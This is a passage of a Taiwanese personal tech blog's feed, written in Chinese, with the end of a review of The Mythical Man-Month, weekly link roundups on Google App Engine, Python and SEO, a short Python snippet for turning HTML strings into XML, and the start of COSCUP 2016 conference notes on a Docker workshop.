&lt;li&gt;即便是採用 Extreme Programming，把程式拆成好幾個部份，不要一次設計全部。我覺得還是得需要先設計出一個約略的架構，否則到最後應該還是會有拼不起來的問題？  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;img alt="content 6" src="/files/the-mythical-man-month/6.jpg" /&gt;  &lt;ul&gt;
&lt;li&gt;即便已經證實有更有效的方法，人類也很難在短時間內就讓自己改變已經習慣的方法。  &lt;/li&gt;
&lt;li&gt;看看特別用來設計讓人打字變慢的 QWERTY 鍵盤還是遠遠多餘特別設計用來讓人打字變快的 Dvorak 鍵盤就知道了？  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;p&gt;特別喜歡第 16 章：《沒有銀彈》，&lt;br /&gt;
點出了很多軟體開發中本質上的瓶頸。&lt;br /&gt;
其實跟社會上所有的問題一樣，&lt;br /&gt;
改變最慢的永遠是人類。&lt;br /&gt;
我想這也是這本書可以暢銷這麼久的原因吧？&lt;br /&gt;
科技進步的速度飛快，&lt;br /&gt;
但人類的思考方式與軟體開發的方式其實並無太大幅度的成長。&lt;br /&gt;
而軟體工程又與其他工程有著不小的差異，&lt;br /&gt;
例如建築工程，增加搬運工人、水泥車等等，&lt;br /&gt;
基本上可以讓建築速度獲得提升。&lt;br /&gt;
但對於軟體工程來說，&lt;br /&gt;
對一個已經開始開發的專案，&lt;br /&gt;
加入新的軟體工程師，&lt;br /&gt;
基本上只會讓進度更加落後。&lt;br /&gt;
（這也是本書的同名章節《人月神話》所表達的核心觀念）  &lt;/p&gt;
&lt;p&gt;但軟體又不能慢慢開發，&lt;br /&gt;
房子蓋了很久才蓋好仍然可以住人，&lt;br /&gt;
但軟體開發很久才開發完的話，&lt;br /&gt;
等開發出來以後早就過時而且沒人要用了。  &lt;/p&gt;
&lt;p&gt;然後印象中，&lt;br /&gt;
《焦油坑》那個章節也滿不錯的。&lt;br /&gt;
（請原諒一個過了一個月才回想讀書內容的人QQ）  &lt;/p&gt;
&lt;p&gt;真的是個值得多閱讀幾次的好書，&lt;br /&gt;
我覺得不管是專案管理者還是軟體開發者真的都推薦看一下。  &lt;/p&gt;
&lt;p&gt;軟體開發真的還有很多本質上的難題懸而未解，&lt;br /&gt;
後面新的章節也有列出作者認為一旦被解決了，&lt;br /&gt;
就會讓軟體開發有質的躍進的那些問題。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;References&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/The_Mythical_Man-Month"&gt;The Mythical Man-Month - Wikipedia, the free encyclopedia&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Fred_Brooks"&gt;Fred Brooks - Wikipedia, the free encyclopedia&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Software Engineering"></category></entry><entry><title>Y2016W35</title><link href="https://blog.m157q.tw/posts/2016/09/05/y2016w35/" rel="alternate"></link><published>2016-10-12T11:18:54+08:00</published><updated>2016-10-12T11:18:54+08:00</updated><author><name>M157q</name></author><id>tag:blog.m157q.tw,2016-09-05:posts/2016/09/05/y2016w35/</id><summary type="html">&lt;hr /&gt;
&lt;p&gt;最近終於把收集連結給 weekly post 使用的程式改的算是堪用了些，&lt;br /&gt;
會把之前幾週漏掉的 weekly post 補上，&lt;br /&gt;
順便複習一下自己之前看了什麼。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;Algorithm&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.twword.com/wiki/%E6%8B%9C%E5%8D%A0%E5%BA%AD%E5%B0%87%E8%BB%8D%E5%95%8F%E9%A1%8C"&gt;拜占庭將軍問題 - 台灣 Word&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;用來處理點對點通訊的時候的容錯問題，在 COSCUP 2016 的 Docker 進階工作坊聽到的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/zh-tw/%E6%A8%A1%E6%8B%9F%E9%80%80%E7%81%AB"&gt;模擬退火 - 維基百科，自由的百科全書&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;用來解決 Travelling salesman problem (TSP) 的其中一種演算法  &lt;/li&gt;
&lt;li&gt;不知道是大學的時候修演算法的時候不認真還是怎樣，知道 TSP 但沒聽過這個演算法。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Compiler&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://slide.logan.tw/compiler-intro/#/2/15"&gt;Introduction to Compiler Development&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這份投影片真的很棒，個人覺得介紹的非常詳細且易懂，重覆看了好幾次。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;GAE&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://googleappengine.blogspot.tw/2009/06/10-things-you-probably-didnt-know-about.html"&gt;Google App Engine Blog: 10 things you (probably) didn't know about App Engine&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;2009 年的文章了，雖然年代有點久遠，但這十個看起來現在都還是一樣適用。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://cloud.google.com/appengine/articles/deadlineexceedederrors"&gt;Dealing with DeadlineExceededErrors|App Engine Documentation|Google&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;公司的 GAE 很常出現這個錯誤訊息，所以查了一下。  &lt;/li&gt;
&lt;li&gt;基本上 &lt;code&gt;DeadlineExceededErrors&lt;/code&gt; 有三種 (Python)，以下直接複製貼上：  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;google.appengine.runtime.DeadlineExceededError&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;raised if the overall request times out, typically after 60 seconds, or 10 minutes for task queue requests.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;google.appengine.runtime.apiproxy_errors.DeadlineExceededError&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;raised if an RPC exceeded its deadline. This is typically 5 seconds, but it is settable for some APIs using the 'deadline' option.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;google.appengine.api.urlfetch_errors.DeadlineExceededError&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;raised if the URLFetch times out.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;這篇講的是第一種。  &lt;/li&gt;
&lt;li&gt;然後通常看到這個第一種錯誤通常都是 API 的效能寫爛了，或是 task queue 裡面的 job 寫爛了卡住。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://cloudplatform.googleblog.com/2016/08/automate-deployments-and-traffic-splitting-with-the-App-Engine-Admin-API.html"&gt;Automate deployments and traffic splitting with the App Engine Admin API&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;好像沒用過這個  &lt;/li&gt;
&lt;li&gt;要把 app.yaml 轉成 JSON 啊  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://cloud.google.com/appengine/docs/python/microservices-on-app-engine"&gt;Microservices Architecture on Google App Engine|App Engine standard environment&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;算是官方教你如何使用 GAE 打造 Microservices 的 tutorial，覺得寫的還算詳細。  &lt;/li&gt;
&lt;li&gt;主要是公司目前使用 GCP 最頻繁的服務就是 GAE 的 standard environment，所以想多瞭解一點。  &lt;/li&gt;
&lt;li&gt;底下的連結大都是這篇 tutorial 的額外參考連結  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://cloud.google.com/appengine/articles/scalability"&gt;Designing for Scale  |  App Engine Documentation  |  Google Cloud Platform&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;2013 年的文章，雖然3年了，但也都還算實用。  &lt;/li&gt;
&lt;li&gt;這篇主要在講使用 GAE 開發要注意哪些事情，否則可能會影響到未來的 scalability，有些的確是看了這篇才知道。  &lt;/li&gt;
&lt;li&gt;雖然看完以後我覺得主要影響的應該是 performance，GAE 畢竟是 PaaS，有些東西是綁死的，所以必須要瞭解一下，否則很容易踩雷。  &lt;/li&gt;
&lt;li&gt;以下直接複製各個要點，點連結看詳細的內容吧。  &lt;ul&gt;
&lt;li&gt;A single entity group in the Datastore should not be updated too rapidly  &lt;/li&gt;
&lt;li&gt;Avoid high write rates to Datastore keys that are lexicographically close  &lt;/li&gt;
&lt;li&gt;Do not set a spending limit that could be exceeded  &lt;/li&gt;
&lt;li&gt;Ensure that you will not hit quota limits on API calls  &lt;/li&gt;
&lt;li&gt;Shard task queues if high throughput is needed  &lt;/li&gt;
&lt;li&gt;Use the default performance settings unless you have tested the impact of changes  &lt;/li&gt;
&lt;li&gt;Use traffic splitting when switching to a new default version  &lt;/li&gt;
&lt;li&gt;Avoid Memcache hot keys  &lt;/li&gt;
&lt;li&gt;Test third-party dependencies  &lt;/li&gt;
&lt;li&gt;Implement backoff on retry  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;最近感觸比較深的應該是 datastore 不要拿來做一些 relational 的 query 吧，因為效能真的不好，畢竟是 NoSQL 的東西，還是拿來存 key-value pair 才是比較好的做法。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://groups.google.com/forum/#!topic/google-appengine/DbWfCDmKj90"&gt;Frontend vs Backend Instances for Task/Crons processing - Google Groups&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;有人在論壇發問 Task queue 的 job 是 GAE 的 front-end instance 還是 back-end instance 在處理，底下有人給了解答。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://cloud.google.com/appengine/articles/best-practices-for-app-engine-memcache"&gt;Best Practices for App Engine Memcache For Thread Safety, Performance, and Code Migration&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;算是 GAE 開發上的一些建議，裏面也有一些討論，其實講的蠻詳細的。  &lt;/li&gt;
&lt;li&gt;看完後會有種，用 PaaS 快是快，但真的要處理效能或是用的順手的話真的要注意很多有的沒的問題。  &lt;/li&gt;
&lt;li&gt;畢竟也是其他人寫出來的產品，如果沒有照著其設計理念去使用的話，多少會遇到一些問題以及用不順手的地方。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://cloudplatform.googleblog.com/2013/12/best-practices-for-app-engine-memcache.html"&gt;Google Cloud Platform Blog: Best practices for App Engine: memcache and eventual vs. strong consistency&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這篇算是比較艱深的文章  &lt;/li&gt;
&lt;li&gt;基本上在講述 memcache 和 datastore 比較底層的觀念  &lt;/li&gt;
&lt;li&gt;對於兩者的使用情境在效能方面做些說明  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://cloud.google.com/appengine/docs/python/how-requests-are-routed#routing_via_url"&gt;How Requests are Routed|App Engine standard environment for Python&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這篇是在講 GAE 的 default routing rules  &lt;/li&gt;
&lt;li&gt;基本上只要 GAE 使用不只一個 service (module) 且每個 service 也不只使用一個 version 都應該瞭解一下  &lt;/li&gt;
&lt;li&gt;和下面提到的 &lt;code&gt;dispatch.yaml&lt;/code&gt; 也有關係  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://cloud.google.com/appengine/docs/python/config/dispatchref"&gt;dispatch.yaml reference|App Engine standard environment for Python&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;GAE 可以透過設定 &lt;code&gt;dispatch.yaml&lt;/code&gt; 來設定簡單的 routing rule。  &lt;/li&gt;
&lt;li&gt;但有上限的限制  &lt;ul&gt;
&lt;li&gt;最多只能 20 個 rule。  &lt;/li&gt;
&lt;li&gt;指定 URL 路徑時，路徑不得超過 100 字元。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.manejandodatos.es/2014/12/work-front-end-back-end-google-app-engine/"&gt;How to work with Front-end and back-end in Google App Engine - Manejando da&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;介紹 GAE 的 front-end instance 跟 back-end instance  &lt;/li&gt;
&lt;li&gt;其實我用這麼一段時間了還是沒有很理解  &lt;/li&gt;
&lt;li&gt;只大概知道 Front-end instance 負責處理 static files 跟一分鐘內一定要 response，否則使用者會得到 500 Server Error。  &lt;/li&gt;
&lt;li&gt;Back-end instance 就可以拿來負責處理不需要那麼即時性的事務。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;GCP&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.slideshare.net/peihsinsu/raspberry-pi-fluentd-gcp-cloud-logging-big-query-iot"&gt;使用 Raspberry pi + fluentd + gcp cloud logging, big query 做iot 資料搜集與分析&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;嗯... 好像也沒那麼簡單  &lt;/li&gt;
&lt;li&gt;是說資料視覺化應該也可以接 datalab 吧？  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://cloud.google.com/datalab/docs/quickstarts/quickstart-local"&gt;Run Cloud Datalab locally  |  Google Cloud Datalab  |  Google Cloud Platfor&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Datalab 現在可以在 Local 直接執行了，畢竟它本來就是拿 Jupyter Notebook 去改的，好像也不奇怪？  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Programmer&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://blog.jobbole.com/100737/"&gt;編程超過 30 年，我是如何避開倦怠期的？ - 文章 - 伯樂在線&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這篇是翻譯文，作者是 Andrew Wulf，目前是 Walt Disney 的 Lead iOS Engineer。  &lt;/li&gt;
&lt;li&gt;他的文章都還滿不錯的，&lt;a href="http://thecodist.com/article/phone-interviews-can-be-so-painful-to-do"&gt;有篇在講電話面試的&lt;/a&gt;怨念非常深，因為很多面試者根本啥都沒準備就來面試，讓他覺得根本是在浪費時間。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Python&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://waymoot.org/home/python_string/"&gt;Efficient String Concatenation in Python&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;效能最好的方法是使用 &lt;code&gt;''.join([list_comprehension_of_strings])&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;這篇文章已經非常古老，2004 年的文章，用 Python 3 的話差異可能不會這麼大就是。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;SEO&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://medium.com/startup-grind/seo-is-not-hard-a-step-by-step-seo-tutorial-for-beginners-that-will-get-you-ranked-every-single-1b903b3ab6bb"&gt;SEO is Not Hard — A step-by-step SEO Tutorial for beginners that will get you ranked every single time&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;同事開會要報告 SEO 簡介，剛好就看到這篇，所以順便看一下。  &lt;/li&gt;
&lt;li&gt;文章長度偏長，但裡頭圖文並茂，而且敘述的算蠻有條裡的。  &lt;/li&gt;
&lt;li&gt;算是 SEO 101 的文章吧  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Wikipedia&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://en.wikipedia.org/wiki/Representational_state_transfer"&gt;Representational state transfer - Wikipedia, the free encyclopedia&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;縮寫就是 REST。  &lt;/li&gt;
&lt;li&gt;沒錯，就是那個 REST(ful) API 的 REST。  &lt;/li&gt;
&lt;li&gt;然後其實現在弄 API 也有非 Restful API 的選擇了，像是 gRPC, GraphQL 都是最近滿常聽到的選擇。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="GCP"></category><category term="Compiler"></category><category term="SEO"></category><category term="Python"></category><category term="Datalab"></category><category term="Wikipedia"></category><category term="Programmer"></category><category term="Algorithm"></category><category term="GAE"></category></entry><entry><title>Y2016W34</title><link href="https://blog.m157q.tw/posts/2016/08/29/y2016w34/" rel="alternate"></link><published>2016-10-30T02:05:40+08:00</published><updated>2016-10-30T02:05:40+08:00</updated><author><name>M157q</name></author><id>tag:blog.m157q.tw,2016-08-29:posts/2016/08/29/y2016w34/</id><summary type="html">&lt;h3&gt;Coscup&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.slideshare.net/vh21/linux-kernel-tracing"&gt;Linux kernel tracing&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;COSCUP 2016 的演講之一，覺得這個投影片挺簡潔又有重點。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Rust&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://servo.org/"&gt;Servo, the parallel browser engine&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;看到程式路跑裏面 Rust 的專案。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Web&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://mp.weixin.qq.com/s?__biz=MzAwMDU1MTE1OQ==&amp;amp;mid=2653547697&amp;amp;idx=1&amp;amp;sn=acc748b7fcf0058b58e244970e51eabc&amp;amp;scene=0&amp;amp;from=groupmessage&amp;amp;isappinstalled=0#wechat_redirect"&gt;如何實現 1080P 延遲低於 500ms 的實時超清直播傳輸技術&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這個分享挺棒的，對於技術細節的描述非常詳細，期許自己以後紀錄問題的解決過程和方法也要像這樣子。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Taiwan&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/gossiping/M.1472073912.A.306.html"&gt;Re: [問卦] 有沒有分不清民間信仰跟佛道教的八卦? - 看板 Gossiping - 批踢踢實業坊&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;又是個看八卦版長知識的一篇文章，講了很多我完全不知道的台灣民間信仰的由來。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;無蝦米&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/Liu/M.1471684938.A.01B.html"&gt;[打屁] 分享自己寫的嘸蝦米 vim plugin - 看板 Liu - 批踢踢實業坊&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;pi 真的很愛 vim plugin，什麼時候要成為 vim plugin 大師？ XD  &lt;/li&gt;
&lt;li&gt;想想自己學了一下無蝦米就沒用了，但真的是個很棒的輸入法。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="Web"></category><category term="Rust"></category><category term="Html"></category><category term="無蝦米"></category><category term="Wikipedia"></category><category term="Coscup"></category><category term="Taiwan"></category></entry><entry><title>Convert HTML string to XML string with Python</title><link href="https://blog.m157q.tw/posts/2016/08/28/convert-html-string-to-xml-string-with-python/" rel="alternate"></link><published>2016-08-28T00:47:20+08:00</published><updated>2016-08-28T00:47:20+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-08-28:posts/2016/08/28/convert-html-string-to-xml-string-with-python/</id><summary type="html">&lt;h2&gt;Python 2&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;HTMLParser&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;HTMLParser&lt;/span&gt;  
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;xml.sax.saxutils&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;escape&lt;/span&gt;  

&lt;span class="n"&gt;xml_str&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;escape&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;HTMLParser&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;unescape&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;html_str&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h2&gt;Python 3&lt;/h2&gt;
&lt;h3&gt;Python 3.3 or older&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;html.parser&lt;/span&gt; &lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="n"&gt;HTMLParser&lt;/span&gt;  
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;xml.sax.saxutils&lt;/span&gt; &lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="n"&gt;escape&lt;/span&gt;  

&lt;span class="n"&gt;xml_str&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;escape&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;HTMLParser&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;unescape&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;html_str&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Pytho 3.4+&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;html&lt;/span&gt;  
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;xml.sax.saxutils&lt;/span&gt; &lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="n"&gt;escape&lt;/span&gt;  

&lt;span class="n"&gt;xml_str&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;escape&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;html&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;unescape&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;html_str&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h1&gt;Reference&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://stackoverflow.com/questions/2360598/how-do-i-unescape-html-entities-in-a-string-in-python-3-1"&gt;How do I unescape HTML entities in a string in Python 3.1? - Stack Overflow&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Python"></category><category term="Python 2"></category><category term="Python 3"></category><category term="HTML"></category><category term="XML"></category></entry><entry><title>COSCUP 2016</title><link href="https://blog.m157q.tw/posts/2016/08/25/coscup-2016/" rel="alternate"></link><published>2016-08-25T10:15:00+08:00</published><updated>2016-08-25T10:15:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-08-25:posts/2016/08/25/coscup-2016/</id><summary type="html">&lt;h1&gt;INFO&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Official website: &lt;a href="http://coscup.org/2016"&gt;http://coscup.org/2016&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Note: &lt;a href="http://beta.hackfoldr.org/coscup2016"&gt;http://beta.hackfoldr.org/coscup2016&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Day 1: 2016/08/20 Sat&lt;/h1&gt;
&lt;p&gt;早上其實沒聽什麼議程，&lt;br /&gt;
先隨便逛了一下攤位，&lt;br /&gt;
在VLC 的攤位待了一下子，&lt;br /&gt;
之前好像沒看過 VLC 來 COSCUP，&lt;br /&gt;
跟兩個法國人聊天，&lt;br /&gt;
還吃了法國來的糖果，&lt;br /&gt;
拿了一張 VLC 的貼紙，&lt;br /&gt;
對於沒有實體交通錐覺得有點小遺憾（？）&lt;br /&gt;
&lt;img alt="vlc" src="/files/coscup-2016/vlc.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;然後隔壁的 MOPCON 攤位很應 Pokemon GO 的景，&lt;br /&gt;
讓大家有神奇寶貝可以收服 XD&lt;br /&gt;
&lt;img alt="mopcon-pokemon" src="/files/coscup-2016/mopcon-pokemon.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;後來一直待在天瓏攤位翻書，&lt;br /&gt;
畢竟平常沒有跑天瓏實體書店的習慣，&lt;br /&gt;
而且 Conf 擺攤的折扣又比會員卡還便宜，&lt;br /&gt;
加上今年開始工作以後，&lt;br /&gt;
買書終於可以不用像以前因為價錢而猶豫不決，&lt;br /&gt;
所以今年 PyCon, HITCON 的時候都有到天瓏攤位買書，&lt;br /&gt;
一次大概買三到四本左右，&lt;br /&gt;
&lt;a href="https://twitter.com/M157q/status/766861133231759361"&gt;結果這次又買就被老闆記住了 XD&lt;/a&gt;&lt;br /&gt;
反正想說在 Conf 買比較便宜，&lt;br /&gt;
而且最近每年大概也只固定跑 PyCon, HITCON, COSCUP 這三場 Conf，&lt;br /&gt;
先買些書囤起來，&lt;br /&gt;
之後再看應該不為過吧？&lt;br /&gt;
只是每天花在閱讀實體書的時間要再增加了，（畢竟今年的目標可是多閱讀實體書啊）&lt;br /&gt;
最近比較沒有撥時間出來閱讀。（一定都是 Pokemon GO 的錯）&lt;br /&gt;
&lt;img alt="tenlong" src="/files/coscup-2016/tenlong.jpg" /&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;13:15~16:00 Docker 進階工作坊&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Slides: &lt;a href="https://docs.google.com/presentation/d/1yABG8gVJlzWMQnEAOJnMpFRoEXeDACnCHFR7HmFDWaA/pub?start=false&amp;amp;loop=false&amp;amp;delayms=3000&amp;amp;slide=id.p"&gt;https://docs.google.com/presentation/d/1yABG8gVJlzWMQnEAOJnMpFRoEXeDACnCHFR7HmFDWaA/pub?start=false&amp;amp;loop=false&amp;amp;delayms=3000&amp;amp;slide=id.p&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Hands-on Lab: &lt;a href="https://github.com/philipz/docker_workshop"&gt;https://github.com/philipz/docker_workshop&lt;/a&gt;  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href="https://www.katacoda.com/docker/courses/docker2016/1"&gt;Docker 官方 Web 投票微服務範例&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.katacoda.com/philipz/scenarios/7"&gt;Docker Compose &amp;amp; CircleCI&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.katacoda.com/philipz/scenarios/2"&gt;Node.js 最精簡映像檔建置&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://docs.docker.com/engine/userguide/eng-image/dockerfile_best-practices/#/onbuild"&gt;Dockerfile ONBUILD&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;An ONBUILD command executes after the current Dockerfile build completes. ONBUILD executes in any child image derived FROM the current image. Think of the ONBUILD command as an instruction the parent Dockerfile gives to the child Dockerfile.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.katacoda.com/docker/courses/docker2016/2"&gt;Docker Compose 和 Service Discovery&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;會眾反應：Docker Network 在 Docker 1.9 的時候，40G 的網路可以用到 30G，但到 Docker 1.12 的時候，只能用到 3G 多。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.katacoda.com/docker/courses/docker2016/4"&gt;Docker Compose for MySQL Cluster &amp;amp; WordPress&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://galeracluster.com/products/"&gt;Galera Cluster&lt;/a&gt;  &lt;ul&gt;
